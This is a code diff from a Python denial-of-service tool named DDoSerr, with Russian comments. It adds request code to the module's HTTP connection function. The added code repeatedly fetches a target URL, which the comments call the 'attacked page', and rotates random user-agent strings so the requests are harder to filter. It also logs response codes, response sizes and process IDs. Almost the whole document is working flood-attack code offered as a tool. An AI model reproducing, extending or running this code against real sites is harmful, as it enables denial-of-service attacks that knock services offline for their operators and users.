@@ -60,7 +60,7 @@ DDoSerr Copyright © 2018 Константин Панков
 
 """
 Модуль отправки HTTP-запросов для DDoSerr.
-v.1.6.2.14b. от 23.08.2018.
+v.1.6.2.15b. от 23.08.2018.
 """
 
 """
@@ -114,12 +114,33 @@ def http_connection(repeat, pause, url):
         random_agent = user_agents.Agents().random_agent()
         
         """
-        #Отправляем один запрос к заглавной странице. Не актуально, но работало.
-        #main_page = session.get(url, stream=True)
-        
         #Для post запросов, пригодится в будущем.
         #main_page = requests.post("http://httpbin.org/post")
         """
+        
+        #Запрос к url (атакуемой странице) с юзер агентом в сессии.
+        main_page = session.get(url, stream=True, headers=\
+        {'User-Agent': random_agent})
+        
+        #Получение информации по запросу к странице по url.
+        
+        #Код возврата.
+        status_url = str(main_page.status_code)
+        #Размер ответа. Большой ответ разбивается на куски по 8196 Байт.
+        size_url = str(sum(len(chunk) for chunk in main_page.iter_content(8196)))
+    
+        #Этот вывод результата (для наглядности работы и отладки)
+        #можно убрать для небольшого повышения производительности.
+        print(status_url, size_url)
+        
+        answer_url = str("code " + status_url + "," + '\t' + "size " + 
+        size_url + " bytes")
+        
+        #Логгируем запуск процесса с его PID.
+        logging.info('Process ' + str(os.getpid()) + ' received the task.')
+        #Логгируем результаты.
+        logging.info('URL: ' + url)
+        logging.info('Answer: ' + answer_url)
         
         """
         !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
